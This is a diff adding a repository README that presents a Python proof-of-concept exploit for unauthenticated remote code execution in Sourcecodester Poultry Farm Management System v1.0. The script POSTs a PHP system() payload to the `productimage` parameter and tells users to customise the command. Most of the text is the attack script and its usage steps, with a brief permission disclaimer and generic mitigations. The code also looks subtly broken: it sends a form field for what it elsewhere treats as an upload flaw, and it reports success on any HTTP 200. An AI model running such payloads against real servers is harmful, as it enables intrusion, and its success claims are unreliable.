@@ -1,0 +1,101 @@
+# Proof of Concept (PoC) for Unauthenticated Remote Code Execution in Sourcecodester Poultry Farm Management System v1.0
+
+This repository contains a Proof of Concept (PoC) script demonstrating an unauthenticated remote code execution (RCE) vulnerability in Sourcecodester Poultry Farm Management System v1.0. The vulnerability exists in the `productimage` parameter at `/farm/product.php`, allowing an attacker to execute arbitrary code on the server.
+
+## Table of Contents
+
+- [Vulnerability Description](#vulnerability-description)
+- [Setup and Usage](#setup-and-usage)
+  - [PoC Script](#poc-script)
+- [Important Considerations](#important-considerations)
+- [Mitigation](#mitigation)
+
+## Vulnerability Description
+
+**CVE-ID**: (Pending)
+
+**Overview**: 
+Sourcecodester Poultry Farm Management System v1.0 contains an unauthenticated remote code execution (RCE) vulnerability via the `productimage` parameter at `/farm/product.php`. This vulnerability allows an attacker to execute arbitrary code on the server without authentication.
+
+**Affected Version**: 
+- Sourcecodester Poultry Farm Management System v1.0
+
+## Setup and Usage
+
+### Prerequisites
+
+- Python 3.x
+- `requests` library (`pip install requests`)
+
+### PoC Script
+
+This script demonstrates how an attacker can exploit the RCE vulnerability by sending a malicious request to the vulnerable parameter.
+
+Save the following script as `rce_poc.py` and run it.
+
+```python
+import requests
+
+# Configuration
+target_url = "http://target-url/farm/product.php"  # Change this to the target URL
+
+# Malicious payload
+# The payload should be a command that the server can execute, e.g., 'ls' to list directory contents
+# Here, we are using a simple PHP payload to demonstrate the RCE
+payload = "<?php system('ls'); ?>"
+
+# Construct the malicious request
+data = {
+    'productimage': payload  # The vulnerable parameter
+}
+
+def exploit_rce(url, data):
+    """
+    Exploit the RCE vulnerability by sending a malicious request to the target URL.
+
+    Args:
+        url (str): The target URL.
+        data (dict): The data to be sent in the POST request.
+    """
+    try:
+        response = requests.post(url, data=data)
+        
+        # Print the response details
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.text)
+        
+        if response.status_code == 200:
+            print("[+] Successfully executed the payload.")
+        else:
+            print("[-] Failed to execute the payload.")
+    except requests.RequestException as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    print(f"Sending malicious request to: {target_url}")
+    exploit_rce(target_url, data)
+```
+
+### Explanation
+
+1. **Configuration**: Set the `target_url` to the URL of the vulnerable server's `/farm/product.php` endpoint.
+2. **Payload**: The payload is a simple PHP command execution payload. You can modify the payload to execute different commands as needed.
+3. **Construct the Request**: The script constructs a POST request with the malicious payload in the `productimage` parameter.
+4. **Exploit Function**: The `exploit_rce()` function sends the malicious request to the target URL and prints the response details.
+5. **Run the Script**: When executed, the script will attempt to exploit the RCE vulnerability and print the results.
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test this vulnerability on the target system. Unauthorized testing is illegal and unethical.
+- **Testing Environment**: Perform this test in a controlled environment to avoid impacting production systems.
+- **Payload Customization**: Customize the payload as needed to achieve the desired command execution.
+
+## Mitigation
+
+To mitigate this vulnerability, apply the following steps:
+
+- **Input Validation**: Implement proper input validation to sanitize user inputs.
+- **File Upload Restrictions**: Restrict file uploads to only allow specific file types and enforce size limits.
+- **Update Software**: Regularly update your software to the latest version to apply security patches and fixes.
+
+By following these mitigation steps and security best practices, you can prevent vulnerabilities such as this RCE issue in Sourcecodester Poultry Farm Management System v1.0.
